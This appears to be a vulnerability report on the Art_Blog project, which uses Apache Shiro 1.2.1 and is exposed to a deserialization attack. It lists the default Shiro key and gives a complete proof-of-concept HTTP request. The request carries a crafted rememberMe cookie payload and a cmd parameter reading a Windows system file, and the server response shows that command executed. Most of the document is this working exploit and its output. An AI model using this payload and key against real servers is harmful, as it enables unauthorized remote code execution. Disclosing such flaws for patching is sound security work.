### Art_Blog deserialization vulnerability



### project address

https://gitee.com/luotf/Art_Blog
Vulnerability analysis: The Art_Blog project is built using shiro 1.2.1 and has a deserialization vulnerability.

![img](https://cdn-images-1.medium.com/max/900/0*aM8Y_ak2H_YJiid5)

The default key of shiro is kPH+bIxk5D2deZiIxcaaaA==

### To reproduce the vulnerability, you can use shiro no cc to execute the command

POCï¼š

```
POST http://127.0.0.1:8080/ HTTP/1.1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Cookie: rememberMe=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
Host: 127.0.0.1:8080
Proxy-Connection: keep-alive
Content-Length: 27

cmd=type C:\windows\win.iniHTTP/1.1 200 
Set-Cookie: JSESSIONID=71FA59EC5992A727CBE41F017741CDE7; Path=/; HttpOnly
Date: Wed, 06 Sep 2023 09:29:33 GMT
Connection: close
Content-Length: 92

; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```